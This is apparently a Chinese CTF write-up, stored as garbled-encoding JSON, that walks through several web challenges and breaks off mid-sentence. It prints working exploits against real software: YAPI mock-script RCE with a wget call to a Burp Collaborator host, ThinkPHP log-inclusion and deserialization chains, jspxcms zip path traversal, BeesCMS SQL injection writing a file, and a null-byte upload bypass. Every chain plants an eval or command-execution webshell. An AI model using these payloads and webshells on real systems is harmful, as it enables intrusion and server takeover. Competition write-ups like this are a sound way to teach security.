[{"categories":["CTF"],"contents":"cat flag  ç®€ç®€å•å•cat flag\nHint: ç®¡ç†å‘˜æ›¾è®¿é—®è¿‡flag\n \u0026lt;?php if (isset($_GET[\u0026#39;cmd\u0026#39;])) { $cmd = $_GET[\u0026#39;cmd\u0026#39;]; if (!preg_match(\u0026#39;/flag/i\u0026#39;,$cmd)) { $cmd = escapeshellarg($cmd); system(\u0026#39;cat \u0026#39; . $cmd); } } else { highlight_file(__FILE__); } ?\u0026gt;æç¤ºç®¡ç†å‘˜è®¿é—®è¿‡ï¼Œå…ˆcat /var/log/nginx/access.log\nä¹‹åç”¨%faç»•è¿‡ /?cmd=this_is_final_fl%faag_e2a457126032b42d.php\nreview - Nginx é‡è¦æ–‡ä»¶ç›®å½•ï¼š\n é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š/etc/nginx ä¸»è¦é…ç½®æ–‡ä»¶ï¼š/etc/nginx/conf/nginx.conf ç®¡ç†è„šæœ¬ï¼š/usr/lib64/systemd/system/nginx.service æ¨¡å—ï¼š/usr/lisb64/nginx/modules åº”ç”¨ç¨‹åºï¼š/usr/sbin/nginx ç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š/usr/share/nginx/html æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š/var/log/nginx/access.log  ezrce  ä½ çœŸçš„ä¼š nodejs å—ï¼Ÿ\n æ˜¯ä¸€ä¸ªYAPIçš„ä¸»é¡µï¼Œæ ¹æ®é¢˜ç›®é‡Œrceçš„æç¤º æœæœçœ‹å·²çŸ¥çš„æ¼æ´ï¼šYapi å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´\né‚£å°±å¥½åŠäº† è·Ÿç€æ¥å°±è¡Œå’¯ï¼›é¦–å…ˆåˆ›å»ºä¸€ä¸ªé¡¹ç›®\nä¹‹åä¿®æ”¹å…¨å±€mockè„šæœ¬\nconst sandbox = this const ObjectConstructor = this.constructor const FunctionConstructor = ObjectConstructor.constructor const myfun = FunctionConstructor(\u0026#39;return process\u0026#39;) const process = myfun() mockjson = process.mainModule.require(\u0026#34;child_process\u0026#34;).execSync(\u0026#34;command\u0026#34;).toString() ä¹‹åæ·»åŠ æ¥å£\nè„šæœ¬ä¸­çš„execSync()å¤„å¯rceï¼Œå…ˆç”¨wget http://xxxxx.burpcollaborator.netè¯•è¯•æ°´\nå¾ˆé¡ºåˆ©å˜› å¥½è€¶ï¼\ncat `ls`\t// spawnSync /bin/sh ENOBUFS cat `cd ../;ls`\t// config.json, init.lock, log, vendors cat `cd ../../;ls`\t// app, bin, boot, dev, etc, ffffffflllllaggggg, home, lib, lib64, media, mnt, opt, proc, root, run, sbin, srv, start.sh, tmp, usr, var cd ../../;cat `ls`\t// app, bin,boot, dev, etc, home, lib, lib64, media, mnt,opt, proc, root, run, sbin, srv, sys, tmp, usr, var cat `cd ../../;cat ffffffflllllaggggg`\t// flag{5d096f4f-8c32-49b6-bed4-b485eb1cf08b} easythinkphp  easythinkphp\n åªæœ‰ä¸€ä¸ªthinkphp 3.2.3çš„æ¬¢è¿é¡µé¢ï¼Œtpçš„æ´å¾ˆå¤š å¯ä»¥ç›´æ¥æ‹¿æ¥æ‰“ï¼Œå‚è€ƒï¼šã€æ¼æ´é€šæŠ¥ã€‘ThinkPHP3.2.x RCEæ¼æ´é€šæŠ¥\n/index.php?m=--\u0026gt;\u0026lt;?=phpinfo();?\u0026gt; /index.php?m=Home\u0026amp;c=Index\u0026amp;a=index\u0026amp;value[_filename]=./Application/Runtime/Logs/Common/21_08_01.log å…ˆéªŒè¯ä¸€ä¸‹æ–‡æ¡£ä¸­çš„æ–¹æ³•ï¼ŒæˆåŠŸï¼Œä¹‹åæŠŠphpinfoæ¢æˆè‡ªå·±çš„ä¸€å¥è¯æœ¨é©¬\n/index.php?m=--\u0026gt;\u0026lt;?=eval($_POST['wuhu']);?\u0026gt; ä¼ å…¥å ç”¨èšå‰‘è¿æ¥å°±èƒ½æ‹¿flagäº†~\næˆ–è€…ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ThinkphpGUIä¸€æŠŠæ¢­ï¼ä¸€é”®getshell ä½ å€¼å¾—æ‹¥æœ‰\njspxcms ä¹Ÿæœ‰ç°æˆçš„æ´å¯ä»¥ç›´æ¥ç”¨ï¼Œå‚è€ƒï¼šå¤ç°jspxcmsè§£å‹getshellæ¼æ´ | ä»£ç å®¡è®¡| Jspxcmsæ–‡ä»¶ä¸Šä¼ æ¼æ´(CNVD-2019-40540) | è®°ä¸€æ¬¡ç”±è¿½è¸ªæº¯æºå‘ç°çš„â€œä¸å®‰å…¨è§£å‹getshellâ€\né¦–å…ˆæ„é€ å«jspğŸçš„æ¶æ„waråŒ…ï¼ŒğŸé•¿è¿™æ ·\n\u0026lt;% if(\u0026quot;023\u0026quot;.equals(request.getParameter(\u0026quot;pwd\u0026quot;))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\u0026quot;wuhu\u0026quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\u0026quot;\u0026lt;pre\u0026gt;\u0026quot;); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\u0026quot;\u0026lt;/pre\u0026gt;\u0026quot;); } %\u0026gt; ä¹‹åæ”¾å…¥ä¸€ä¸ªè§£å‹åä¼šè‡ªåŠ¨å®Œæˆç›®å½•ç©¿è¶Šçš„zipåŒ…ä¸­ è¿™ä¸ªè¿‡ç¨‹ç”±pyè„šæœ¬å®Œæˆ\nimport zipfile if __name__ == \u0026#34;__main__\u0026#34;: try: binary = b\u0026#39;\u0026lt;script\u0026gt;alert(\u0026#34;helloworld\u0026#34;)\u0026lt;/script\u0026gt;\u0026#39; zipFile = zipfile.ZipFile(\u0026#34;test123.zip\u0026#34;, \u0026#34;a\u0026#34;, zipfile.ZIP_DEFLATED) info = zipfile.ZipInfo(\u0026#34;test123.zip\u0026#34;) zipFile.writestr(\u0026#34;../../../../dog123.html\u0026#34;, binary) zipFile.close() except IOError as e: raise e import zipfile z = zipfile.ZipFile(\u0026#39;test123.zip\u0026#39;, \u0026#39;a\u0026#39;, zipfile.ZIP_DEFLATED) with open(\u0026#39;wuhu.war\u0026#39;, \u0026#39;rb\u0026#39;)as f: temp = f.read() z.writestr(\u0026#39;../../../../wuhu.war\u0026#39;, temp) z.close() éœ€è¦æ³¨æ„çš„æ˜¯ æœ€ç»ˆæˆ‘ä»¬è¦ç©¿è¶Šåˆ°çš„ç›®å½•æ˜¯ç½‘ç«™æ ¹ç›®å½•çš„ä¸Šå±‚ï¼Œå³webappsç›®å½•ä¸‹ ä¸ROOTç›®å½•åŒçº§ï¼Œå½“waråŒ…ä½äºè¿™ä¸ªç›®å½•ä¸‹æ‰ä¼šè‡ªåŠ¨éƒ¨ç½²\nç›´æ¥cat /flagå°±å¥½å•¦\ncybercms  èµ›åšCMSï¼Œåªä¸ºå®‰å…¨è€Œç”Ÿ\nHintï¼šä¿¡æ¯æœé›†æ˜¯ä¸€ä¸ªwebæ‰‹å¿…å¤‡çš„æŠ€èƒ½\n ä¸€ä¸ªï¼ˆä¼ªï¼‰cmså¹³å°ä»‹ç»çš„é¡µé¢ï¼Œæ¯”è¾ƒç®€é™‹ï¼Œé¦–é¡µ/åº”ç”¨æ¡ˆä¾‹å¤„æ˜¾ç¤ºhacked by ymnhï¼Œåœ¨ymnhçš„å’¨è¯¢é¡µé¢å¤„æœ‰è¿™æ ·çš„æŠ¥é”™\nåœ¨é¦–é¡µ/æ–°é—»åŠ¨æ€å¤„ï¼Œå‡ ä¹æ‰€æœ‰çš„å¸–å­éƒ½æ˜¯hacked by xxx~~ï¼ˆæœ¬æ¥æˆ‘è¿˜ä»¥ä¸ºæ˜¯å¤šä¹ˆå¤æ‚çš„é•¿ç¯‡å¤§è®ºï¼‰~~ï¼Œåœ¨å¦‚ä½•å®‰è£…å’Œä½¿ç”¨æ¨¡æ¿è¿™ç¯‡ä¸‹æœ‰æ²¡åˆ å¹²å‡€çš„ä¸œè¥¿\nå¦‚ä½•è®¾ç½®è¿›ç«™è¯­è¨€è¿™ç¯‡é‡Œç«Ÿç„¶æ˜¯è¿™æ ·çš„è‰ çœŸæ˜¯èšŒåŸ ä½äº† å›¾ç©·åŒ•è§äº†å±äºæ˜¯2333333\næ ¹æ®è¿™äº›ï¼Œå¯ä»¥å¾—çŸ¥æ•´ä¸ªç«™æ˜¯å®Œå…¨ç§»æ¤/å¥—å£³beescmsçš„ æ‰€ä»¥æ¥ç€å»æ‰¾å·²å­˜åœ¨çš„æ´ï¼Œå‚è€ƒï¼šBeescms_v4.0 sqlæ³¨å…¥æ¼æ´åˆ†æ\nåœ¨adminååŠ å•å¼•å·ï¼Œæç¤ºè¡¨åæ˜¯bees_adminï¼Œæœ‰id, admin_name, admin_password, admin_purview, is_disableå…±5ä¸ªå­—æ®µ\nç®€å•fuzzå¯çŸ¥ï¼šè¿‡æ»¤äº†ç©ºæ ¼ï¼ˆç”¨/**/ç»•è¿‡ï¼‰ï¼ˆæˆ–è€…ç”¨tabç»•è¿‡ æˆ–è€…%0aç»•è¿‡ éƒ½å¯ä»¥ï¼‰ï¼Œè¿‡æ»¤äº†select, outfileï¼ˆåŒå†™ç»•è¿‡ï¼‰ï¼Œå¯¹å°–æ‹¬å·è½¬ä¹‰ä¸ºhtmlå®ä½“ï¼ˆç”¨hexç»•è¿‡ï¼‰\nuser=admin'/**/union/**/selselectect/**/1,2,3,4,5# å›æ˜¾æ­£å¸¸ï¼Œæ¥ç€å°è¯•å†™å…¥shellï¼ˆè¿™é‡Œè¦å†™æ¸…æ¥šç»å¯¹è·¯å¾„ï¼Œåœ¨ä¸Šé¢çš„ä¸€å¼ æŠ¥é”™çš„é¡µé¢ä¹Ÿæœ‰æ‰€æç¤ºäº†ï¼‰\nadmin'/**/union/**/selselectect/**/1,2,3,4,0x3c3f3d6576616c28245f504f53545b2777756875275d293b3f3e/**/into/**/ououtfiletfile/**/'/var/www/html/wuhu.php'# å¥½è€¶ï¼Œè¿èšå‰‘æ‹¿flagå’¯\nez_website  ç®€å•çš„é¢˜ç›®\n ä¹Ÿæ˜¯ç°å®ä¸–ç•Œå­˜åœ¨çš„ä¸œè¥¿ï¼Œå‚è€ƒï¼šé½åšå»ºç«™ç³»ç»Ÿx1.0ä»£ç å®¡è®¡\nç›´æ¥ç”¨å·²æœ‰çš„é“¾å­æ‰“\n\u0026lt;?php namespace think\\process\\pipes { class Windows { private $files = []; public function __construct($files) { $this-\u0026gt;files = [$files]; //$file =\u0026gt; /think/Modelçš„å­ç±»new Pivot(); Modelæ˜¯æŠ½è±¡ç±»  } } } namespace think { abstract class Model{ protected $append = []; protected $error = null; public $parent; function __construct($output, $modelRelation) { $this-\u0026gt;parent = $output; //$this-\u0026gt;parent=\u0026gt; think\\console\\Output;  $this-\u0026gt;append = array(\u0026#34;xxx\u0026#34;=\u0026gt;\u0026#34;getError\u0026#34;); //è°ƒç”¨getError è¿”å›this-\u0026gt;error  $this-\u0026gt;error = $modelRelation; // $this-\u0026gt;error è¦ä¸º relationç±»çš„å­ç±»ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯OnetoOneç±»çš„å­ç±»==\u0026gt;\u0026gt;HasOne  } } } namespace think\\model{ use think\\Model; class Pivot extends Model{ function __construct($output, $modelRelation) { parent::__construct($output, $modelRelation); } } } namespace think\\model\\relation{ class HasOne extends OneToOne { } } namespace think\\model\\relation { abstract class OneToOne { protected $selfRelation; protected $bindAttr = []; protected $query; function __construct($query) { $this-\u0026gt;selfRelation = 0; $this-\u0026gt;query = $query; //$queryæŒ‡å‘Query  $this-\u0026gt;bindAttr = [\u0026#39;xxx\u0026#39;];// $valueå€¼ï¼Œä½œä¸ºcallå‡½æ•°å¼•ç”¨çš„ç¬¬äºŒå˜é‡  } } } namespace think\\db { class Query { protected $model; function __construct($model) { $this-\u0026gt;model = $model; //$this-\u0026gt;model=\u0026gt; think\\console\\Output;  } } } namespace think\\console{ class Output{ private $handle; protected $styles; function __construct($handle) { $this-\u0026gt;styles = [\u0026#39;getAttr\u0026#39;]; $this-\u0026gt;handle =$handle; //$handle-\u0026gt;think\\session\\driver\\Memcached  } } } namespace think\\session\\driver { class Memcached { protected $handler; function __construct($handle) { $this-\u0026gt;handler = $handle; //$handle-\u0026gt;think\\cache\\driver\\File  } } } namespace think\\cache\\driver { class File { protected $options=null; protected $tag; function __construct(){ $this-\u0026gt;options=[ \u0026#39;expire\u0026#39; =\u0026gt; 3600, \u0026#39;cache_subdir\u0026#39; =\u0026gt; false, \u0026#39;prefix\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;path\u0026#39; =\u0026gt; \u0026#39;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../runtime/temp/a.php\u0026#39;, \u0026#39;data_compress\u0026#39; =\u0026gt; false, ]; $this-\u0026gt;tag = \u0026#39;xxx\u0026#39;; } } } namespace { $Memcached = new think\\session\\driver\\Memcached(new \\think\\cache\\driver\\File()); $Output = new think\\console\\Output($Memcached); $model = new think\\db\\Query($Output); $HasOne = new think\\model\\relation\\HasOne($model); $window = new think\\process\\pipes\\Windows(new think\\model\\Pivot($Output,$HasOne)); echo urlencode(serialize($window)); } ä¸Šä¼ \n/index.php/index/labelmodels/get_label?tag_array[cfg]=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00selfRelation%22%3Bi%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22xxx%22%3B%7Ds%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A135%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fruntime%2Ftemp%2Fa.php%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bs%3A3%3A%22xxx%22%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3Br%3A11%3B%7D%7D%7D è™½ç„¶ä¼šè¿”å›ä¸€ä¸ªæŠ¥é”™çš„é¡µé¢ï¼Œä½†æ˜¯å¯ä»¥åœ¨/index.php/index/image/headers?url=file:///var/www/html/runtime/temp/a.php12ac95f1498ce51d2d96a249c09c1998.phpå¤„éªŒè¯ä¸€ä¸‹æ˜¯å¦å†™ä¸Šäº†ğŸï¼Œæ–‡ä»¶åå­—æ˜¯md5('tag_'.md5($this-\u0026gt;tag))ï¼Œè¿æ¥å¯†ç æ˜¯ccc ç›´æ¥èšå‰‘\nåœ¨é›ªæ®‡çš„wpä¸­ç”¨çš„æ˜¯å¦ä¸€ä¸ªï¼Œæ›´ç›´æ¥çš„å†™ğŸæ–¹å¼ï¼Œä¸‹é¢è¯´ä¸€ä¸‹æ€è·¯ï¼ˆå¤§æ¦‚\næˆ‘ä»¬å¯ä»¥å…ˆå°è¯•çœ‹çœ‹æ•æ„Ÿå‡½æ•°file_put_contents()æ˜¯å¦èƒ½åˆ©ç”¨\nåœ¨application/admin/controller/Upgrade.phpä¸‹çœ‹åˆ°äº†æ–‡ä»¶å†™å…¥çš„å‡½æ•°ï¼Œå®ƒä½äºåœ¨writelog()ä¸­ï¼Œè¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½æ˜¯å¤„ç†postè¯·æ±‚ä¼ å…¥çš„å„é¡¹å‚æ•°\nè¿™ä¸ªconfig('client_upgrade_edition')æï¼Œè·Ÿäº†ä¸€ä¸‹ å®ƒä¼šè¿”å›nullï¼Œå†å¾€ä¸Šçœ‹åˆ°_initialize()\næ‰€ä»¥æœ€åæ˜¯ä¼šå°†$upgrade_editionå†™å…¥ä¸­/runtime/client_upgrade_edtion.phpä¸­ï¼›è€Œæ•´ä¸ªwritelog()å‡½æ•°ä¼šè¢«sysup()è°ƒç”¨\nè·Ÿè¿›è¿™ä¸ªsysup()å’Œ$upgrade_edtionï¼Œçœ‹æ˜¯å¦å¯ç”¨+å¦‚ä½•ç”¨\nåœ¨template/admin_style/default/admin/upgrade/index.htmä¸‹çœ‹åˆ°äº†ç¡®å®å­˜åœ¨çš„è·¯ç”±ï¼Œè¿™ä¸ªçš„é¡µé¢æ˜¯åœ¨åå°ç®¡ç†ä¸­å¿ƒ - ç³»ç»ŸåŠŸèƒ½ - ç³»ç»Ÿåœ¨çº¿å‡çº§å¤„ï¼Œéšä¾¿å‡ä¸€ä¸ªçœ‹çœ‹\næŠ“åŒ…ä¹‹åçœ‹åˆ°è¿™é‡Œç¡®å®æœ‰postè®¿é—®å’Œupgrade_edtionå‚æ•°ï¼Œé‚£å°±ç¨³äº†ï¼Œç›´æ¥å†™ğŸ\n/admin.php/admin/upgrade/sysup.html?upgrade_edition=%22,%22%22=%3E-eval($_POST[%27cmd%27])-%22,];?%3E// å°†ğŸå†™è¿›çš„ç›®æ ‡é¡µé¢/runtime/client_upgrade_edition.phpè¿å…¥èšå‰‘ æ‹¿flagå³å¯\nâ€”â€”â€”â€”æ¯”èµ›çš„æ—¶å€™æˆ‘å…¶å®æ˜¯æ²¡æœ‰æœåˆ°é½åšå»ºç«™ç³»ç»Ÿx1.0ä»£ç å®¡è®¡è¿™ç¯‡çš„ï¼Œå½“æ—¶æ€è·¯æ˜¯åœ¨åå°åœ¨æ‰¾æœ‰æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„åœ°æ–¹ç›´æ¥å†™ğŸ ï¼Œå½“æ—¶æ‰¾çš„æ˜¯ç‹¬ç«‹é¡µç®¡ç†ï¼Œå°è¯•uploadï¼Œä½†æ˜¯å¹¶ä¸å¤ªè¡Œï¼ˆä¹Ÿå¯èƒ½æ˜¯æˆ‘å¤ªèœäº†ï¼‰ï¼Œç„¶åä¹Ÿæ²¡å»å®¡ä»£ç ï¼ˆæ‡’ç‹—ï¼‰æ‰€ä»¥ å°±æ²¡å‡ºè¿™ä¸ªé¢˜ï¼Œç°åœ¨çœ‹è¿˜æ˜¯ç–å¿½äº† ç¡®å®å®Œå…¨æ²¡æ³¨æ„åˆ°ç³»ç»Ÿåœ¨çº¿å‡çº§è¿™ä¸ªæ¨¡å—æ˜¯å¯ç”¨çš„ ä¹Ÿæ²¡æœ‰è®¤çœŸçš„åˆ†ææºç  æˆ‘çš„è¿‡\nå®‰å…¨,å®‰å…¨,è¿˜æ˜¯xxxçš„å®‰å…¨  æŸä¸ªç‰¹åˆ«å®‰å…¨çš„å•†åº—\nHint:\nCREATE TABLE \u0026#34;users\u0026#34; ( \u0026#34;id\u0026#34; INTEGER NOT NULL, \u0026#34;username\u0026#34; TEXT UNIQUE , \u0026#34;login_password\u0026#34; text, \u0026#34;money\u0026#34; INTEGER, \u0026#34;pay_password\u0026#34; TEXT, \u0026#34;flag_num\u0026#34; INTEGER, PRIMARY KEY (\u0026#34;id\u0026#34;) ); CREATE TABLE \u0026#34;flaaaaaaaaag\u0026#34; ( \u0026#34;flllllllag\u0026#34; TEXT );  ç‰¹åˆ«ç®€é™‹çš„å‰ç«¯ï¼Œæœ‰ç™»å½•å’Œæ³¨å†Œå’Œä¸»é¡µä¸‰ä¸ªé¡µé¢ï¼Œç™»å½•å¤„æœ‰ä¸€å®šè¿‡æ»¤ å­˜åœ¨sqliä»»æ„æ³¨å†Œè´¦å·ï¼Œèµ°ä¸€æ³¢æµç¨‹\nğŸ˜…èšŒåŸ ä½äº†\nå›è¿‡å¤´æ¥çœ‹ä¸€ä¸‹Burpå¯¹åˆšæ‰æ“ä½œçš„æŠ“åŒ…ç»“æœï¼Œä»cookieå¯ä»¥çŸ¥é“åç«¯æ˜¯flaskæ¡†æ¶ ï¼Œflaskçš„è¯ä¸€èˆ¬æ ‡é…sqliteæ•°æ®åº“ï¼Œç„¶åçœ‹ä¸‹é¡µé¢æºç \næ³¨å†Œæ—¶ç”¨postæäº¤ä¿¡æ¯ï¼Œå¯†ç éƒ¨åˆ†ç”¨çš„æ˜¯md5(app.users.password+'CBCTF')ï¼Œæ”¯ä»˜å¯†ç æ˜¯encrsa(app.users.pay_password)ï¼Œå¥½å®¶ä¼™ è¿™ä¸ªåŠ å¯† pay_passwordéƒ¨åˆ†md5+rsa+b64\u0026hellip;\u0026hellip;\nâ€”â€”â€”â€”æ¯”èµ›çš„æ—¶å€™åŸºæœ¬å°±åœåˆ°è¿™é‡Œäº†ï¼Œæ„Ÿè§‰æ˜¯sqli ä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆæ³¨ å…¨æ˜¯md5çš„ï¼Œä»¥ä¸‹æ˜¯å‚è€ƒwpä¹‹åçš„å¤ç°\nèµ›åè®²é¢˜çš„æ—¶å€™ å‡ºé¢˜å¸ˆå‚…è¯´å‚è€ƒçš„æ˜¯è¿™ä¸€ç¯‡æ–‡ç« æ•°æ®åŠ å¯†æˆ–æˆWAFå¤±æ•ˆæœ€å¤§å…ƒå‡¶â€¦ï¼ˆåŸå¸–è¢«404äº† åªæœ‰ä¸ªå¿«ç…§ è¿˜æ˜¯ç™¾åº¦å¿«ç…§æ‰èƒ½çœ‹ è€Œä¸”æ²¡å›¾ï¼‰æ ¸å¿ƒæ˜¯è¿™ä¸€æ®µ\nè¿™ä¸ªé¢˜çš„flagè´­ä¹°å°ç«™ï¼Œå¯¹pay_passwordæ˜¯è¿›è¡Œå‰ç«¯md5+rsa+b64åŠ å¯†ï¼Œåç«¯å†å¯¹åº”ç€æ‹¿ç§é’¥è§£å¯†ï¼Œå­˜å…¥æ•°æ®åº“çš„æ˜¯md5å€¼ï¼Œçœ‹ä¼¼å¾ˆå®Œç¾ ä½†æ˜¯å…¶å®æ ¹æœ¬æ²¡æœ‰wafçš„ä»‹å…¥ æ²¡æœ‰å¯¹å‚æ•°è¿›è¡Œä»»ä½•è¿‡æ»¤ï¼Œå¦‚æœæˆ‘ä»¬ä»ä¸­é—´ä»‹å…¥ åªä¿ç•™rsa+b64çš„éƒ¨åˆ† å°±å¯ä»¥ä»»æ„æ§åˆ¶å‚æ•°è¾¾åˆ°äºŒæ¬¡æ³¨å…¥çš„æ•ˆæœ\nå…¬é’¥åœ¨ç½‘é¡µæºç ä¸­å·²ç»ç»™å‡ºï¼Œæ•°æ®è¡¨çš„ç»“æœä¹Ÿå·²ç»åœ¨Hintä¸­äº†ï¼Œç”¨cyberchefä¸€æŠŠæ¢­\né‡æ–°æ³¨å†Œä¸ªè´¦å·ï¼Œåªä¿®æ”¹ä¸€ä¸‹usernameå³å¯ passwdä¸ç”¨å˜ å°†pay_passwordä¿®æ”¹ä¸ºä¸Šé¢ç”Ÿæˆçš„å€¼ï¼Œç™»é™†åå³å¯çœ‹åˆ°flag\njj\u0026rsquo;s camera  jjåœ¨æŸæ¬¡ç½‘ç»œå®‰å…¨æ´»åŠ¨ä¸­å‘ç°äº†ä¸ªé»‘å®¢åšçš„ç½‘ç«™ï¼Œè¯·ä½¿ç”¨httpsè®¿é—®ç«™ç‚¹\nHint: ç½‘ä¸Šèƒ½æœåˆ°æºç ï¼Œä»…ä¿®æ”¹äº†å‰ç«¯uiï¼Œæ³¨æ„æœåŠ¡å™¨çš„å“åº”\n ä¹Ÿæ˜¯å·²æœ‰çš„ä¸œè¥¿ ä½†æ˜¯æ¯”èµ›çš„æ—¶å€™æˆ‘æ²¡æœåˆ°æºç ï¼ˆå°´å°¬ï¼‰æºç åœ¨è¿™é‡Œï¼šåœ¨å—å®è´ï¼Ÿä½ ç‚¹å¼€è¿™ä¸ªç½‘å€çœ‹çœ‹[æ‰“å¼€ç½‘ç«™å·æ‹ç…§ç‰‡] | ç‚¹å¼€ä¸€ä¸ªç½‘å€æˆ‘è¢«è®°å½•äº†ipè¿˜å·æ‹äº†ç…§ç‰‡\nï¼ˆæˆ‘è¿™ä¸ªæ™ºå•†çœŸçš„æ˜¯è´Ÿæ•°èµ·æ­¥çš„ ä¸Šé¢è¿™ä¸¤ä¸ªå¸–å­æˆ‘çœ‹äº†å¥½ä¹… æ‰ååº”è¿‡æ¥è¿™ä¸ªé’“é±¼ç½‘ç«™æ˜¯è¦å¹²å•¥ã€‚ã€‚ã€‚ã€‚\nå‰ç«¯æ˜¯ä¸€ä¸ªé“¾æ¥ç”Ÿæˆç«™ ä¸­é—´å¯ä»¥åŠ ä¸€ä¸ªidçš„å‚æ•°ï¼Œè®¿é—®åä¼šè‡ªåŠ¨è°ƒç”¨æ‘„åƒå¤´ï¼ˆä½†æ˜¯ä¼šæœ‰ä¸ªæç¤ºçš„å¼¹çª—ï¼‰ï¼Œå…ˆæ‹ç…§å†ç›¸åº”é“¾æ¥ï¼Œä¹‹åå¯ä»¥åˆ°å…ˆå‰çš„é¡µé¢æŸ¥çœ‹æ‹åˆ°çš„ç…§ç‰‡ï¼Œæ•°æ®ä»¥postçš„å½¢å¼ä¸Šä¼ è‡³/qbl.php?id=xxx\u0026amp;url=xxxï¼Œè¿™æ˜¯qbl.phpçš„æºç \n\u0026lt;?php error_reporting(0); $base64_img = trim($_POST[\u0026#39;img\u0026#39;]); $id = trim($_GET[\u0026#39;id\u0026#39;]); $url = trim($_GET[\u0026#39;url\u0026#39;]); $up_dir = \u0026#39;./img/\u0026#39;;//å­˜æ”¾åœ¨å½“å‰ç›®å½•çš„imgæ–‡ä»¶å¤¹ä¸‹ if(empty($id) || empty($url) || empty($base64_img)){ exit; } if(!file_exists($up_dir)){ mkdir($up_dir,0777); } if(preg_match(\u0026#39;/^(data:\\s*image\\/(\\w+);base64,)/\u0026#39;, $base64_img, $result)){ $type = $result[2]; if(in_array($type,array(\u0026#39;bmp\u0026#39;,\u0026#39;png\u0026#39;))){ $new_file = $up_dir.$id.\u0026#39;_\u0026#39;.date(\u0026#39;mdHis_\u0026#39;).\u0026#39;.\u0026#39;.$type; file_put_contents($new_file, base64_decode(str_replace($result[1], \u0026#39;\u0026#39;, $base64_img))); header(\u0026#34;Location: \u0026#34;.$url); } } ?\u0026gt;file_put_contents()æ‰§è¡Œæ–‡ä»¶å†™å…¥ï¼Œå†…å®¹å¯æ§+è·¯å¾„å·²çŸ¥ï¼Œè¿‡æ»¤çš„ç‚¹åœ¨äºåç¼€åæ˜¯bmpæˆ–png å¹¶ä¸”åªæœ‰é™¤å»åç¼€çš„è¿™æ–‡ä»¶åå¯æ§ï¼Œphpç‰ˆæœ¬æ˜¯5.2.17ï¼Œç”¨00æˆªæ–­ç»•è¿‡ï¼ˆpostéƒ¨åˆ†è¦urlencodeä¸€ä¸‹ burpæˆ–è€…hackbarå°±ç›´æ¥è½¬äº†\n/qbl.php?id=wuhu.php%00a\u0026amp;url=http://baidu.com POST: img=data:image/png;base64,PD9waHAgQGV2YWwoJF9QT1NUWyd3dWh1J10pOyA/Pg== å‚è€ƒï¼šwp\neasyweb æœ‰ä¸€ä¸ªdockerçš„é™„ä»¶å’Œä¸€äº›æºç \né¦–é¡µå°±æ˜¯ä¸ªç™½åº•é»‘å­—çš„Hello Worldï¼Œå®¡ä¸‹æºç \nç›´æ¥æ‰“æ–­ç‚¹è°ƒè¯•ä¸€ä¸‹ï¼ˆå› ä¸ºè¿™é‡Œæ¶‰åŠåˆ°sessionçš„è°ƒç”¨ æ‰€ä»¥åœ¨.vscodeä¸­çš„launch.jsonå¤„æ·»åŠ ä¸€ä¸ªconfiguration: \u0026quot;justMyCode\u0026quot;: falseè¿™æ ·å¯ä»¥åœ¨è°ƒç”¨å †æ ˆå¤„çœ‹åˆ°å®Œæ•´çš„è°ƒç”¨æƒ…å†µ\nå¯ä»¥æ³¨æ„åˆ°æ¯æ¬¡åˆ·æ–°ä¹‹å sessionçš„å€¼éƒ½ä¼šå‘ç”Ÿå˜åŒ–ï¼Œè°ƒè¯•çš„æ—¶å€™å¯ä»¥çœ‹åˆ°ç”Ÿæˆè¿™ä¸ªsessionæ—¶è°ƒç”¨äº†dumpsæ–¹æ³•ï¼Œæ‰€ä»¥è¿™ä¸ªé¢˜å°±æ˜¯ååºåˆ—åŒ–çš„å¥—è·¯å•¦\npayloadæœ‰ä¸¤ç§å§ åå¼¹shell 